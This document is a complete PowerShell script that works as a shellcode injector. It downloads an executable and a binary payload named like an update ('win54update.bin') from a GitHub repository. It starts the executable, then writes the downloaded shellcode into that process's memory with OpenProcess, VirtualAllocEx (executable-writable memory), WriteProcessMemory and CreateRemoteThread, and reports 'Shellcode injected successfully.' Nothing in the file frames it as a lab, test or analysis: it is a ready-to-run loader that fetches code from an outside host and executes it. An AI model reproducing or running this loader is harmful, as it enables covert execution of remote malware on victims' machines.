try {
    # Force errors to stop execution
    $ErrorActionPreference = "Stop"

    # Download the target executable
    $testAppUrl = "https://raw.githubusercontent.com/Magturn/win54/main/win54file.exe"
    $tempPath   = "$env:TEMP\win54file.exe"
    Invoke-WebRequest -Uri $testAppUrl -OutFile $tempPath -ErrorAction Stop

    # Start the target process
    $targetProcess = Start-Process -FilePath $tempPath -PassThru -ErrorAction Stop
    Start-Sleep -Seconds 3
    if (-not $targetProcess) { throw "Target process did not start." }

    $targetPID = $targetProcess.Id

    # Download the shellcode (or payload)
    $agentUrl = "https://raw.githubusercontent.com/Magturn/win54/main/win54update.bin"
    $wc = New-Object System.Net.WebClient
    $shellcode = $wc.DownloadData($agentUrl)
    if ($shellcode.Length -eq 0) { throw "Shellcode download failed or is empty." }

    # C# signature with properly escaped quotes
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
    Add-Type $signature -ErrorAction Stop

    # Define constants
    $PROCESS_ALL_ACCESS     = 0x1F0FFF
    $MEM_COMMIT             = 0x1000
    $MEM_RESERVE            = 0x2000
    $PAGE_EXECUTE_READWRITE = 0x40

    # Open target process handle
    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
    if ($hProcess -eq [IntPtr]::Zero) { throw "OpenProcess failed." }

    # Allocate memory in target process
    $size = $shellcode.Length
    $allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
    if ($allocAddress -eq [IntPtr]::Zero) {
        [Win32]::CloseHandle($hProcess)
        throw "VirtualAllocEx failed."
    }

    # Write shellcode into allocated memory
    [int]$bytesWritten = 0
    $result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
    if (-not $result -or $bytesWritten -ne $shellcode.Length) {
        [Win32]::CloseHandle($hProcess)
        throw "WriteProcessMemory failed."
    }

    # Create a remote thread to execute the shellcode
    $threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    if ($threadHandle -eq [IntPtr]::Zero) {
        [Win32]::CloseHandle($hProcess)
        throw "CreateRemoteThread failed."
    }

    # Clean up
    [Win32]::CloseHandle($hProcess)
    Write-Output "Shellcode injected successfully."
}
catch {
    Write-Error "An error occurred: $_"
}
